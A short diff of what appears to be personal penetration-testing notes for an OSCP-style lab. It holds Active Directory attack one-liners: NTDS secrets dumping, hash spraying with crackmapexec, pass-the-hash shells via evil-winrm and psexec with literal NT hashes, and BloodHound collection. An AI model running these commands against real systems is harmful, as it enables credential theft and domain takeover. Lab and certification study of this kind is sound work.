@@ -1051,7 +1051,7 @@ impacket-secretsdump - ntds ntds.dit - system SYSTEM LOCAL
 
 crackmapexec winrm 192.168.124.175 -u users -H hashesh
 evil-winrm -i 192.168.124.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
-impacket-psexec 'choi.local/Administrator:Password123!'@192.168.124.175
+impacket-psexec oscp.exam/tom_admin@10.10.103.146 -hashes :4979d69d4ca66955c075c41cf45f24dc
 
 # SharpHOund
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Desktop -OutputPrefix test
